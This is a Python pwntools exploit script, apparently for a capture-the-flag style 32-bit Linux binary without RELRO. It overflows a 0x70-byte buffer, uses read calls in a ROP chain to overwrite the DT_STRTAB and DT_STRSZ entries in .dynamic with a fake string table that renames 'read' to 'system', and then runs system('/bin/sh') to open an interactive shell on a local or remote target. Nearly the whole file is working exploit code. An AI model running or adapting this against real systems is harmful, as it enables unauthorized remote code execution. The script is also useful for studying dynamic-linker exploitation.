from pwn import *
context(os="linux", arch="i386")

def debug_on():
	if (args.DEBUG):
		context.log_level = "debug"

g_fname = "./main_no_relro_32"
g_elf = ELF(g_fname)

if (args.LOCAL):
	g_io = process(g_fname)
else:
	g_io = remote(args.HOST, int(args.PORT))

def getpid():
	if (args.LOCAL):
		print("pid: %d\n", g_io.proc.pid)
		pause()
	
def pwn():
	padding_len = 0x70
	rop = ROP(g_elf)
	rop.raw(padding_len*'a')
	dynsec = g_elf.get_section_by_name(".dynamic")
	dynsec_addr = dynsec.__getitem__("sh_addr")
	# DT_STRTAB's subscript is 8 (start form 0), and sizeof(Elf32_Dyn)==8 Bytes
	off_dt_strtab_val = 8 * 8 + 4 # +4 is the offset of Elf32_Dyn.d_un.ptr
	# modify DT_STRTAB's ptr in ".dynamic" section, make it points to a fake ".dynstr"
	rop.read(0, dynsec_addr + off_dt_strtab_val, 4)
	
	# constructs a fake ".dynstr"(STRTAB) beyond the end of .dynamic segment.
	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"read", b"system")
	fake_dynstr_addr = dynsec_addr + 0x200
	rop.read(0, fake_dynstr_addr, len(fake_dynstr))	

	# modify DT_STRSZ's d_val
	off_dt_strsz_val = 10 * 8 + 4
	rop.read(0, dynsec_addr + off_dt_strsz_val, 4)
	
	binsh_addr = fake_dynstr_addr + len(fake_dynstr)
	rop.read(0, binsh_addr, len("/bin/sh\0"))

	rop.raw(0x8048376) # read@plt's 2nd instruction
	rop.raw(0xdeadbeef) # anywere is ok, we got shell before returning to there.
	rop.raw(binsh_addr) # where the "/bin/sh\0" locates.

	g_io.send(rop.chain())
	g_io.send(flat(fake_dynstr_addr))
	g_io.send(fake_dynstr)
	g_io.send(flat(len(fake_dynstr)))
	g_io.send("/bin/sh\0")

	
if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()
